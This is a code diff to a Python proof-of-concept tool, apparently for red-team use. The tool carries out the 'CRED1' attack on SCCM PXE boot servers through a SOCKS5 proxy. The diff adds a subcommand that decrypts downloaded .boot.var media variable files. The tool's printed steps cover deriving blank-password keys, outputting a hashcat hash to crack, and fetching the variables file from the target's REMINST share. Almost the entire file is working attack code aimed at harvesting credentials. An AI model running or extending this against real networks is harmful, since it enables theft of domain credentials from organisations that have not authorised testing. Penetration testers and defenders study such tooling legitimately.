@@ -4,13 +4,49 @@ import argparse
 
 # Parse arguments
 parser = argparse.ArgumentParser(description="SCCM CRED1 SOCKS5 POC")
-parser.add_argument("target", help="SCCM PXE IP")
-parser.add_argument("src_ip", help="Source IP")
-parser.add_argument("socks_host", help="SOCKS5 proxy host")
-parser.add_argument("socks_port", help="SOCKS5 proxy port", type=int)
-parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)
+subparsers = parser.add_subparsers(dest="mode")
+
+# Main attack mode (default when no subcommand)
+attack_parser = subparsers.add_parser("attack", help="Run the CRED1 attack against a PXE server")
+attack_parser.add_argument("target", help="SCCM PXE IP")
+attack_parser.add_argument("src_ip", help="Source IP")
+attack_parser.add_argument("socks_host", help="SOCKS5 proxy host")
+attack_parser.add_argument("socks_port", help="SOCKS5 proxy port", type=int)
+attack_parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)
+
+# Decrypt mode — decrypt a local .boot.var file with a key
+decrypt_parser = subparsers.add_parser("decrypt", help="Decrypt a locally downloaded .boot.var file")
+decrypt_parser.add_argument("file", help="Path to the .boot.var file")
+decrypt_parser.add_argument("key", help="Decryption key (hex)")
+
 args = parser.parse_args()
 
+# For backwards compatibility: if no subcommand, treat positional args as attack mode
+if args.mode is None:
+    attack_parser = argparse.ArgumentParser(description="SCCM CRED1 SOCKS5 POC")
+    attack_parser.add_argument("target", help="SCCM PXE IP")
+    attack_parser.add_argument("src_ip", help="Source IP")
+    attack_parser.add_argument("socks_host", help="SOCKS5 proxy host")
+    attack_parser.add_argument("socks_port", help="SOCKS5 proxy port", type=int)
+    attack_parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)
+    args = attack_parser.parse_args()
+    args.mode = "attack"
+
+if args.mode == "decrypt":
+    # Decrypt a local file with the given key
+    sccm_client = sccm.SCCM(None, None, None)
+    try:
+        with open(args.file, "rb") as f:
+            filedata = f.read()
+        key_bytes = bytes.fromhex(args.key)
+        decrypted = sccm_client.decrypt_media_file(filedata, key_bytes)
+        print("[*] Decrypted media variables:")
+        print(decrypted)
+    except Exception as e:
+        print(f"[!] Decryption failed: {e}")
+    exit()
+
+# Attack mode
 if args.target == None or args.socks_host == None or args.socks_port == None or args.src_ip == None:
     print("Usage: python3 main.py <target> <src_ip> <socks_host> <socks_port>")
     exit()
@@ -42,10 +78,10 @@ if data_variables is None:
         decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
         if decrypt_password:
             print(f"[*] Derived key: {decrypt_password.hex()}")
-            print(f"[*] Decrypt with: python3 pxethiefy.py decrypt -p {decrypt_password.hex()} -f <variables_file>")
+            print(f"[*] Then decrypt with: python3 main.py decrypt <variables_file> {decrypt_password.hex()}")
     else:
         print("[*] PXE media is password-protected (no crypto key in DHCP response)")
-        print("[*] Decrypt with: python3 pxethiefy.py decrypt -p PASSWORD -f <variables_file>")
+        print("[*] Then decrypt with: python3 main.py decrypt <variables_file> <cracked_password_hex>")
     exit()
 
 if cryptokey is None:
@@ -68,7 +104,7 @@ if cryptokey is None:
         print(hashcat_hash)
         print("[*] Crack this hash, then re-run with: -p <cracked_password_hex>")
         print(f"[*] Or download the variables file from: \\\\{args.target}\\REMINST{variables}")
-        print("[*] And decrypt with: python3 pxethiefy.py decrypt -p PASSWORD -f <variables_file>")
+        print(f"[*] Then decrypt with: python3 main.py decrypt <variables_file> <cracked_password_hex>")
 else:
     # No password set — crypto key IS in the DHCP response, can decrypt directly
     print("[*] No PXE password set (crypto key found in DHCP response)")
@@ -83,4 +119,4 @@ else:
         except Exception as e:
             print(f"[!] Decryption failed: {e}")
             print(f"[*] Download the variables file manually from: \\\\{args.target}\\REMINST{variables}")
-            print(f"[*] Decrypt with: python3 pxethiefy.py decrypt -p {decrypt_password.hex()} -f <variables_file>")
+            print(f"[*] Then decrypt with: python3 main.py decrypt <variables_file> {decrypt_password.hex()}")
